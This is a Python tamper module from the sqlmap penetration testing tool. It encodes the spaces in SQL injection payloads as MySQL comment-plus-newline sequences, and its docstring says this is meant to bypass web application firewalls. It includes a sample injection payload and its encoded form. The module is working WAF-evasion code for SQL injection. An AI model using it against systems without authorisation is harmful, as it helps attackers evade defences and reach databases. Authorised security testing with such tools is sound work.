#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

from lib.core.compat import xrange
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def tamper(payload, **kwargs):
    """
    Replaces space character (' ') with a pound character ('#') followed by a new line ('\n')

    Requirement:
        * MySQL

    Notes:
        * Useful to bypass several web application firewalls
        * The '#' single-line comment used here is MySQL-only (despite this script's legacy name);
          T-SQL has no '#' comment, so it does not apply to Microsoft SQL Server

    >>> tamper('1 AND 9227=9227')
    '1%23%0AAND%23%0A9227=9227'
    """

    retVal = ""

    if payload:
        quote, doublequote = False, False

        for i in xrange(len(payload)):
            if payload[i] == '\'' and (i == 0 or payload[i - 1] != '\\'):
                quote = not quote
            elif payload[i] == '"' and (i == 0 or payload[i - 1] != '\\'):
                doublequote = not doublequote

            if not quote and not doublequote:
                if payload[i].isspace():
                    retVal += "%23%0A"
                elif payload[i] == '#' or payload[i:i + 3] == '-- ':
                    retVal += payload[i:]
                    break
                else:
                    retVal += payload[i]
            else:
                retVal += payload[i]

    return retVal
